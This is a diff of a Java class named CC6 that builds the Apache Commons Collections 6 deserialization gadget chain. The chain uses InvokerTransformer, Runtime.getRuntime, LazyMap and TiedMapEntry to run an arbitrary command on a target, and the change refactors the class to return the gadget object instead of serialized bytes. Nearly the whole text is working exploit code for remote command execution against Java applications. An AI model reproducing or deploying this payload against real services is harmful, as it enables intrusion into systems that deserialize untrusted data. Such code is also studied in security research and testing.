@@ -6,16 +6,15 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+import org.gadget.inter.Gadget;
 
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
-public class CC6 {
-    public static byte[] getBytes(String common) throws Exception {
+public class CC6 implements Gadget {
+    public Object getObject(String common) throws Exception {
         ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
@@ -47,8 +46,6 @@ public class CC6 {
         keyField.setAccessible(true);
         keyField.set(node, tiedMapEntry);
 
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        new ObjectOutputStream(byteArrayOutputStream).writeObject(map);
-        return byteArrayOutputStream.toByteArray();
+        return map;
     }
 }
